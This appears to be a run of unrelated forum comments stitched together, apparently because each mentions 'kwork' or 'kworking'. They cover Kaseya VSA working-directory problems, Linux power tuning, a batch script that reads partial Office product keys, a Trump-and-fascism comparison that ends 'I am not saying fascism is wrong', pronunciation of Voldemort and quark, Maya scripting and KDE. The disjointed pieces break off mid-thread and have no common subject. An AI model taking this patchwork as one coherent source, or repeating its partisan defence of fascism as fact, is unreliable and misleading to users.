6. Add the **getVariable()** step, set the top-right dropdown to **File Content**, and set the 2nd dropdown to the path of the output text file (**#dir#\TextFileName.txt**). Give the variable a name like **output** (notice there are no #'s in the name). Then in the procedure you can use **#output#** to refer to the content of that text file. You can do things like using the **writeProcedureLogEntry()** step under System to write **#output#** to the procedure log, and then you can create an Info Center report that shows those log entries.

I'd be interested in hearing what you're doing that's presenting a challenge.  You can contact me via the [mspbuilder.com](https://mspbuilder.com) website if you want to take it offline. I have a couple of API bugs that we're working on with the engineering team.

With our on-prem customers, most have customized the working directory, and I can't say I've seen any issue like what you're explaining unless the default working directory wasn't set. When it isn't, Kaseya creates KWorking by default, that's where files get delivered until the policy applies and changes things - confusing pretty much everything. When you set the default working directory, the Kaseya agent installer uses that custom folder from the instant it installs and checks in. This is an On-Prem option - you can't set the default working directory in a VSA Tenant. We just moved an MSP to a private SAAS environment (on-prem, but separate instances for their larger customers that leverage their VSA) and they're pretty much forced to use KWorking or deal with the issue you're explaining.

It's easy to find the TEMP environment var in the registry - we create a subfolder there, push all our scripts, install files, etc there. The task writes it's logs there as well. Once the procedure is complete, we use GetFile to upload the log, then recursively delete the folder we created, leaving nothing behind.

The only difference from what Ages4020 is suggesting is reading the registry first to find the TEMP location. Create the #TEMP#\\PROCESS\_NAME folder. Then we either use WriteDirectory to write several files or WriteFile to write individual files to that folder. ExecutePowerShell (or executeCommandLine, which sometimes works better), then GetFile to get the log and DeleteFolder with the recursive option.

We find too many MSPs use the KWorking folder as a temporary repository. This is difficult to clean up, and this leaves behind potential vulnerabilities. Using a TEMP\\working\_folder minimizes the risk because it's present only for the duration of the installation process, then everything is removed.

Used to be achievable by copying template settings. In VSA 9.something they removed the ability to change template settings, because apparently everyone in the MSP world is cool with c:\kworking existing on every machine. Now the only way to set working directory is via policy. Which takes at least 5 minutes. Which means procedures that are in middle of writing files to the machine break and lose permissions to everything, lagging out procedures on that device until it's restarted, when the policy updates the working directory.


Oh but wait, Kaseya released an awesome REST based API that we've been heavily relying on because their scheduling engine works on prayers, so we built a whole application that works with kaseya API to fill in gaps. And that API has a nice endpoint that lets you update the working directory of an agent. 

But, here's the punchline, THAT ENDPOINT DOES NOT WORK AT ALL FOR ANYONE, INCLUDING KASEYA engineers and they'll get back to us when engineering finds the issues. 


Good thing I already achieved what I need to via modifying the MSSQL tables directly. But lets see how long it takes them to come up with that solution. Thank fucking god we didn't switch to the hosted solution.

- Wakeups - programs register to receive some events from the OS, and they start working once an event is received (eg ""new incoming data on the network"", ""mouse moved"", ""key pressed"", etc). Most of the time, these events do not require a lot of work and handling a few events per second doesn't matter that much (of course there are events that can take a lot of time to process, but they're rare and the sooner a long, CPU-hoggy job is over, the better, instead of keeping your CPU awake in higher power states for longer), but if you're receiving a lot of events, this starts to pile up. Once work starts to pile up, your CPU frequency goes up and stays there, and so does your power bill. If an app is receiving a lot of events, this might be something you should consider closing (if you don't need it - or disabling any unneeded functionality if possible) to maximize your battery life. Under Overview, this is *Events/s*, and apps are sorted by that by default. If Category is *kWork* or *Timer*, you usually can't do much about these - they're just required for your OS to work properly. Unusually large amount of Interrupts from any idle device may suggest bad hardware or configuration (eg an idle network interface should show very few, if any, events per second - but if it's idle and bombing your CPU with 200 interrupts/s, that might prompt you to investigate further). Processes are where you're mostly looking for bad citizens - if something gets loaded with events or spends a lot of time working (in the Usage column), you might want to disable that or limit functionality.
- Tunables - Kernel features which let you enable some additional power saving features on the kernel side. The upside is that with solid hardware you'll get better power management for free (although you might have to enable corresponding features in your BIOS/UEFI first). The downside is that with bad hardware (eg with buggy firmware) enabling power management usually ends badly and might occasionally render a given device useless or performance-limited until your PC is rebooted without PM features. Trust me, you'll know when it happens.

Aside from that, configure your system to use the CPU governor that's either power-friendly (scales up slowly, down quickly) or performance-friendly (scales up quickly, down slowly). AFAIK P-States are still broken, but you'll have to take a look in the wiki if it's still the case.

Here it is.  Totally hacky but it works for 32 and 64 bit installs of both 2013 and 2016.

First a batch file to pull the key:

    @echo off
    
    if exist ""C:\program files (x86)\Microsoft Office\Office16\OSPP.VBS"" goto 32bit2016
    if exist ""C:\program files (x86)\Microsoft Office\Office15\OSPP.VBS"" goto 32bit2013
    if exist ""C:\program files\Microsoft Office\Office16\OSPP.VBS"" goto Nativebit2016
    if exist ""C:\program files\Microsoft Office\Office15\OSPP.VBS"" goto Nativebit2013
    echo Ineed44characterssoidonthavetoredomyscript__None &gt; C:\kworking\OSPPResult.txt
    EXIT
    :32bit2016 
    
    cscript ""C:\program files (x86)\Microsoft Office\Office16\OSPP.VBS"" /dstatus | find ""Last"" &gt; C:\kworking\OSPPResult.txt
    EXIT
    
    :32bit2013
    
    cscript ""C:\program files (x86)\Microsoft Office\Office15\OSPP.VBS"" /dstatus | find ""Last"" &gt; C:\kworking\OSPPResult.txt
    EXIT
    
    :Nativebit2016
    
    cscript ""C:\program files\Microsoft Office\Office16\OSPP.VBS"" /dstatus | find ""Last"" &gt; C:\kworking\OSPPResult.txt
    EXIT
    
    :Nativebit2013
    
    cscript ""C:\program files\Microsoft Office\Office15\OSPP.VBS"" /dstatus | find ""Last"" &gt; C:\kworking\OSPPResult.txt
    EXIT

Then a little PowerShell to trim it down to just the 5 characters.  Write this to a network share with the computer name as the filename and you could easily get an entire deployment automatically.

    $Output = [IO.File]::ReadAllText(""C:\kworking\OSPPResult.txt"")
    $ProductKey = $Output.Substring(44).Trim()
    $ProductKey &gt; C:\kworking\keyFirst.txt

Fascism is a form of radicalauthoritarian nationalism that came to prominence in early 20th-century Europe. Fascism is usually placed on the far-right within the traditional left–right spectrum.

Such a state is led by a (1) strong leader — such as a dictator and a martial government or president composed of the members of the governing fascist party — to forge national unity and maintain a stable and orderly socigety.

Another common definition of fascism ; (2) nationalist authoritarian goals of creating a regulated economic structure to transform social relations within a modern, (3) self-determined culture; 
and a (4) political aesthetic of romantic symbolism, 
(5) mass mobilization, 
a (6) positive view of violence, 
and promotion of **(7) masculinity, youth and charismatic leadership**. 

(8)Fascism rejects assertions of violence automatically being negative in nature and views political violence, war, and imperialism.

Pacifism, emotions, complaining, empathy and human rights were seen as weak ideas. War and violence for them was natural. Yet empathy and sympathy were not.

The narrative of the fascist ideology has three core components: ""(i) the rebirth myth, (ii) populist ultra-nationalism and (iii) the myth of decadence""

The myth of decadence plays an important role in the form of political behavior marked by obsessive preoccupation with community decline, humiliation, or victimhood and by compensatory cults of unity, energy, and purity, in which a mass-based party of committed nationalist militants, working in uneasy but effective collaboration with traditional elites, abandons democratic liberties and pursues with redemptive violence and without ethical or legal restraints goals of internal cleansing and external expansion.

Now Trump has been critiqued for the fact that he has supported many policies that are traditionally democratic. This is certainly true because Fascism was influenced by both left and right, conservative and anti-conservative, national and supranational, rational and anti-rational.

A number of historians regard fascism either as a revolutionary centrist doctrine, as a doctrine that mixes philosophies of the left and the right, or as both those things.

Now let's compare with Trumps presidential campaign


populist ultra-nationalism 



(5)Strong Leader.

&gt;Now, our country needs— our country needs a truly great leader, and we need a truly great leader now. We need a leader that wrote “The Art of the Deal.”
&gt;We need a leader that can bring back our jobs, can bring back our manufacturing, can bring back our military, can take care of our vets. Our vets have been abandoned.
the rebirth myth

&gt;We have losers. We have losers. We have people that don’t have it. We have people that are morally corrupt. We have people that are selling this country down the drain.

(I) The Rebirth Myth

&gt;It can happen. Our country has tremendous potential. We have tremendous people.

&gt;Nobody would be tougher on ISIS than Donald Trump. Nobody.
I will find — within our military, I will find the General Patton or I will find General MacArthur, I will find the right guy. I will find the guy that’s going to take that military and make it really work. Nobody, nobody will be pushing us around.

&gt;I will be the greatest jobs president that God ever created. I tell you that.

&gt;I would build a great wall, and nobody builds walls better than me, believe me, and I’ll build them very inexpensively, I will build a great, great wall on our southern border. And I will have Mexico pay for that wall.Mark my words.

&gt;I’ll bring back our jobs from China, from Mexico, from Japan, from so many places. I’ll bring back our jobs, and I’ll bring back our money.

&gt;Sadly, the American dream is dead. But if I get elected president I will bring it back bigger and better and stronger than ever before, and we will make America great again.

&gt;When do we beat Mexico at the border? They’re laughing at us, at our stupidity. And now they are beating us economically. They are not our friend, believe me. But they’re killing us economically.

&gt;That’s right. A lot of people up there can’t get jobs. They can’t get jobs, because there are no jobs, because China has our jobs and Mexico has our jobs. They all have jobs.

And some of them are like third world countries. But we’re becoming a third word country.

Trump is not politically a fascist. Just cultural. Which it ain't that bad. He should be compared to Juan Peron. Ask any Argentine about Juan Peron. Most likely they will like him. Some even liked Agusto Pinochet.

I am not saying fascism is wrong. It has helped some countries. Bernie Sanders comes clean about his socialist leanings. I think so should Trump.

In universe, it is a name which originates from an anagram of a (British) character's name.  The fact that that name is symbolic if it is read as (fairly garbled) French is secondary.

&gt; Just because people ""english-ize"" because they don't know how to pronounce it, it doesn't make that ""the"" new pronunciation. They are just bastardizing a foreign word. the word still retains it's original pronunciation because it's not an English word.

That's not how language works at all.  The way most people pronounce a word absolutely is the way that word is pronounced.  The fact that there are French loanwords in English which are pronounced the same in English and French has absolutely no bearing on my point that that is not a universal rule.

&gt; So why would you decide that voldemort is one of the ones pronounced incorrectly without any in book examples of characters pronouncing it as such?

That's not what I'm arguing.  What I'm saying is that we have no idea how any of the characters in the books pronounce Voldemort.  We know how JKR has said in interviews *she* pronounces Voldemort, but absent any evidence in her in-universe writing, not everyone accepts that as canon, especially as it often conflicts with actual book-canon.  

Secondly, I would suggest that given in our universe, Voldemort is pronounced in English with a terminal 't' sound more often than not, and this pronunciation is universally understood as referring to Voldemort, then in *our universe*, that absolutely is the correct pronunciation.

&gt; I don't really see how this argument can go past that there's no book canon example of anyone pronouncing the word any way, ~~and the author, who chose/created the words in the book canon, said the word they made up is pronounced a certain way.~~

I can't see that someone who makes up a word, whether real or fictional, has absolute right to decide how that word is pronounced.  Presumably, if JKR had tweeted that 'Voldemort' should be pronounced 'Lollipop', you wouldn't be arguing that I would be wrong to ignore her and continue pronouncing it 'Voldemort'?  (Or, to steal Bernard Shaw's (probably not actually Bernard Shaw, but attributed to him) famous example, if I told you of my new word 'ghoti', you would call me absurd to insist it is pronounced identically to 'fish', even though in English 'gh' can be pronounced 'f' (e.g. in 'tough'), 'o' can be pronounced 'i' (e.g. in 'women'), and 'ti' can be pronounced 'sh' (e.g. in 'constitution').

Of course, these are extreme cases: while 'gh' can make an 'f' sound, there are no English examples of this at the beginning of a syllable.  However, it is unquestionably the case that real invented words change their pronunciation to that other than what the creator 'intended'.  'GIF', for example, is pronounced with a hard g by the majority of people, and that is recognised as a valid pronunciation by most major dictionaries, despite the insistences of Steve Wilhite. Likewise, Murray Gell-Mann named the particle the 'quark' (pronounced 'kwork') despite the fact that he derived the word from a line in *Finnegan's Wake* in which it is rhymed with 'Mark' and 'bark'. Modern pronunciation has evolved, and quark can now be pronounced to rhyme with either 'cork' or 'mark'.  I see no reason why invented words should have to be pronounced as the author intended them in the case of JKR when this so plainly isn't the case with other neologisms.

&gt; If there was a Gobbledegook (a made up Goblin language) word and no given pronunciation key in the text, so you ended up pronouncing it in your head incorrectly, would you decide that was the canon pronunciation even after the author states later out of text that the word is pronounced a certain way? 

No, but nor would I decide that just because JKR had said that she pronounces it a certain way, then that is the correct pronunciation.

I've never had to do it before. Usually it was just 

- Put script into the Maya/2015/Scripts folder
- Execute the proc within maya

I've tried placing this at the beginning of the script :

source kWORk_CopySetDrivenKeys_v1.0;

But all it does is run the script. I get a bunch of errors because it just executes everything. Without UI it won't work, and it seems like UI will pop up only if the proc works

Gell-Mann chose the name ""quarks,"" pronounced ""kworks,"" for these three particles, a nonsense word used by James Joyce in the novel Finnegan's Wake:""Three quarks for Muster Mark!""

There are six flavors of quarks. ""Flavors"" just means different kinds. The two lightest are called up and down.

The third quark is called strange. It was named after the ""strangely"" long lifetime of the K particle, the first composite particle found to contain this quark.

The fourth quark type, the charm quark, was named on a whim. It was discovered in 1974 almost simultaneously at both the Stanford Linear Accelerator Center (SLAC) and at Brookhaven National Laboratory.

The fifth and sixth quarks were sometimes called truth and beauty in the past, but even physicists thought that was too cute.

The bottom quark was first discovered at Fermi National Lab (Fermilab) in 1977, in a composite particle called Upsilon ().

The top quark was discovered last, also at Fermilab, in 1995. It is the most massive quark. It had been predicted for a long time but had never been observed successfully until then.

&gt;it's pronounced like ""cork"" so you're making yourself sound really dumb.

But I have never heard it pronounced that way.  Wikipedia says:

&gt;Gell-Mann went into further detail regarding the name of the quark in his book, The Quark and the Jaguar:[45]
In 1963, when I assigned the name ""quark"" to the fundamental constituents of the nucleon, I had the sound first, without the spelling, which could have been **""kwork""**. Then, in one of my occasional perusals of Finnegans Wake, by James Joyce, I came across the word ""quark"" in the phrase ""Three quarks for Muster Mark"". Since ""quark"" (meaning, for one thing, the cry of the gull) was clearly intended to **rhyme with ""Mark""**, as well as ""bark"" and other such words, I had to find an excuse to pronounce it as ""kwork"". But the book represents the dream of a publican named Humphrey Chimpden Earwicker. Words in the text are typically drawn from several sources at once, like the ""portmanteau"" words in ""Through the Looking-Glass"". From time to time, phrases occur in the book that are partially determined by calls for drinks at the bar. I argued, therefore, that perhaps one of the multiple sources of the cry ""Three quarks for Muster Mark"" might be ""Three quarts for Mister Mark"", in which case the pronunciation ""kwork"" would not be totally unjustified. In any case, the number three fitted perfectly the way quarks occur in nature.

Yes I can. KDE has one active designer that does almost all of the work on the default icons and themes. The project has hundreds of developers so it's hardly a main focus.

&gt;I'm not trying to annoy people who like it - but my other ""idiot proof"" argument was actually that they build everything the KDE way... KWin, KPim, Phonon, Kross, Decibel, Dolphin, digiKam, Kira, Kwork, Koffice, Kaddressbook, Kmediaplayer, Kfridge. All out of the box

Right. Decibel never became anything and they are now using Telepathy that is shared with Gnome and other projects. There's no KOffice or KWord (if that's what you mean with ""Kwork"") anymore; It was forked as Calligra and it includes both Words and Krita. Also many of the applications you listed were first of their kind on Linux. They have also almost completely stopped using the ""K"" in application names. I have no idea how creating a uniform platform can be taken as a bad thing. It's the distributions that make the choises what applications are included by default...

&gt;and recent revisions have taken hints from UI from the tablet environments.

I've used KDE for ten years over multiple revisions. I'm not trying to annoy people who like it - but my other ""idiot proof"" argument was actually that they build everything the KDE way...

It's one of the reasons I dislike GNOME... too much bloat and dependant code.

&gt;Whether an author intentionally put a metaphor in a book is completely irrelevant. The reason metaphors exist in books is not so that your English teachers can torture you by having you search for them but instead because reading critically and nonliterally is a huge part of being a person: It is through metaphor and symbolism that we enter into the life of someone else, and begin to ask their big questions as if they were our own.

&gt;It’s worth remembering here that language is itself a symbol (like, you are decoding these characters on your screen and turning them into ideas; if I were writing in Japanese, you wouldn’t be able to turn the characters into ideas) and so all reading is inherently critical. Metaphor and symbol is just another step in the same process, the process of sharing ideas among people who are separated by time and space and death and everything else. So the question of whether J.D. Salinger WANTED Holden’s questions about the ducks in the pond to be a metaphor for his own fears is not an interesting question. The interesting thing is how that metaphor gets inside of us and turns us into Holden, and gives us a way of thinking about our fears of growing up and growing old and losing what is magical about life. THAT is a really interesting thing, and it can only happen inside of us through metaphor.


&gt;We owe it to ourselves to read critically not so that we can get good grades in English but so that we might have better ways to think about the big questions of our existence and the existence of others. Whether J.D. Salinger wanted us to be better at being human doesn’t really matter; even if he didn’t want to, he still gave us some nice tools to make us more aware and engaged.

**Also:**

&gt;Books, at least in my opinion, belong to their readers, and the author’s opinion about how to pronounce words that s/he made up is not any more authoritative or interesting than the opinion of any other reader.
&gt;
&gt;Like, I do not believe that an author has a privileged relationship with a story simply because s/he happens to have written it. Let us take, for example, the word quark. James Joyce uses the word quark in Finnegan’s Wake, and then the physicist Murray Gel-Mann (who along with George Zweig proposed the existence of quarks) appropriated the word to describe a fundamental constituent of matter.
&gt;
&gt;But how to pronounce quark? Reading the text of Finnegan’s Wake, it could easily be argued that Joyce wanted quark pronounced to rhyme with the word Mark, but you could also argue—as Gel-Mann has—that he intended it to slant-rhyme with the word quart. I personally suspect that Joyce wanted us to say kark not kwork, but it doesn’t matter: We say kwork. We decided, collectively, how to pronounce the word, and that’s essentially what language is: It’s a group of people deciding which sounds will describe the world.

&gt;In the extraordinarily unlikely event that some future elementary particle is discovered and named the Bufriedo, we’ll decide how to pronounce it together, and my authorial wishes will rightly be dismissed. Until then, all defendable pronunciations of the word derived from the letters in it will be legitimate.
